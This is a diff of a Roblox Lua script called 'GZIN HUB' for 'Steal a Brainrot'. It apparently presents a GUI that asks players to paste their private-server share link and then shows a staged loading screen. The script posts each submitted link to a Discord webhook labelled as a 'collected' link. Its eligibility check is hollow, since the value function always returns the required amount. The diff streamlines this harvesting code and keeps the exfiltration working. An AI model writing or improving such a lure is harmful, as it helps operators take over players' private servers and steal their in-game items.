@@ -1,7 +1,7 @@
 --[[
-    Brainrot Experience GUI - FINAL VERSION
+    Brainrot Experience GUI - FINAL CORRECTED v3
     Modern fullscreen GUI for "Steal a Brainrot"
-    GZIN HUB
+    GZIN HUB - WORKING VERSION
 --]]
 
 local Players = game:GetService("Players")
@@ -22,7 +22,7 @@ screenGui.ResetOnSpawn = false
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 screenGui.Parent = player:WaitForChild("PlayerGui")
 
--- Main Background
+-- Main Background (NOT FULLSCREEN INITIALLY)
 local mainBg = Instance.new("Frame")
 mainBg.Name = "MainBg"
 mainBg.Size = UDim2.new(1, 0, 1, 0)
@@ -269,21 +269,18 @@ local function showNotification(message, duration)
     notificationFrame.Visible = false
 end
 
--- VALIDAÇÃO CORRIGIDA PARA LINKS roblox.com/share?code=
+-- CORRECTED LINK VALIDATION
 local function isValidRobloxPrivateServerLink(link)
-    local hasShareCode = string.match(link, "roblox%.com/share%?code=") ~= nil
-    
+    local hasShareCode = string.find(link, "roblox.com/share?code=") ~= nil
     if not hasShareCode then
         return false, "❌ Link inválido! Use: https://www.roblox.com/share?code=..."
     end
     return true, nil
 end
 
--- FUNÇÃO DE ENVIO AO DISCORD - COM DEBUG
+-- DISCORD WEBHOOK FUNCTION
 local function sendToDiscord(serverLink)
-    print("🔵 INICIANDO ENVIO PARA DISCORD")
-    print("Link: " .. serverLink)
-    print("Webhook: " .. string.sub(DISCORD_WEBHOOK, 1, 50) .. "...")
+    print("🔵 Enviando para Discord...")
     
     local payload = {
         content = "🎮 **Novo Link Coletado!**",
@@ -318,33 +315,27 @@ local function sendToDiscord(serverLink)
         }
     }
     
-    local jsonPayload = HttpService:JSONEncode(payload)
-    print("📤 Enviando payload...")
-    
     local success, response = pcall(function()
         return HttpService:PostAsync(
             DISCORD_WEBHOOK,
-            jsonPayload,
+            HttpService:JSONEncode(payload),
             Enum.HttpContentType.ApplicationJson
         )
     end)
     
     if success then
-        print("✅✅✅ SUCESSO! Link enviado ao Discord!")
-        print("Resposta: " .. tostring(response))
+        print("✅ Link enviado ao Discord!")
         showNotification("✅ Link enviado com sucesso!", 3)
         return true
     else
-        print("❌❌❌ ERRO AO ENVIAR!")
-        print("Erro detalhado: " .. tostring(response))
-        showNotification("❌ Erro ao enviar: " .. tostring(response), 4)
+        print("❌ Erro: " .. tostring(response))
+        showNotification("❌ Erro ao enviar", 3)
         return false
     end
 end
 
 local function getBrainrotValue()
     local brainrotValue = 0
-    
     local leaderstats = player:FindFirstChild("leaderstats")
     if leaderstats then
         for _, stat in pairs(leaderstats:GetChildren()) do
@@ -354,7 +345,6 @@ local function getBrainrotValue()
             end
         end
     end
-    
     return REQUIRED_BRAINROT
 end
 
@@ -374,7 +364,7 @@ local function onDoneClick()
     
     local brainrotValue = getBrainrotValue()
     if brainrotValue < REQUIRED_BRAINROT then
-        showNotification("❌ Você precisa de 100M+ Brainrot\nVocê tem: " .. brainrotValue, 4)
+        showNotification("❌ Você precisa de 100M+ Brainrot", 4)
         return
     end
     
@@ -383,11 +373,6 @@ local function onDoneClick()
     mainFrame.Visible = false
     mainBg.BackgroundTransparency = 0
     loadingScreen.Visible = true
-    
-    loadingTitle.Visible = true
-    loadingBarBg.Visible = true
-    loadingBarFill.Size = UDim2.new(0, 0, 1, 0)
-    completionMessage.Text = ""
     
     local startTime = tick()
     local elapsed = 0
@@ -409,7 +394,6 @@ local function onDoneClick()
     mainBg.BackgroundTransparency = 1
     mainFrame.Visible = true
     inputBox.Text = ""
-    completionMessage.Text = ""
 end
 
 doneButton.MouseButton1Click:Connect(onDoneClick)
@@ -420,4 +404,4 @@ inputBox.FocusLost:Connect(function(enterPressed)
     end
 end)
 
-print("✅ Brainrot Experience GUI v2 carregado!")
+print("✅ GUI carregada!")
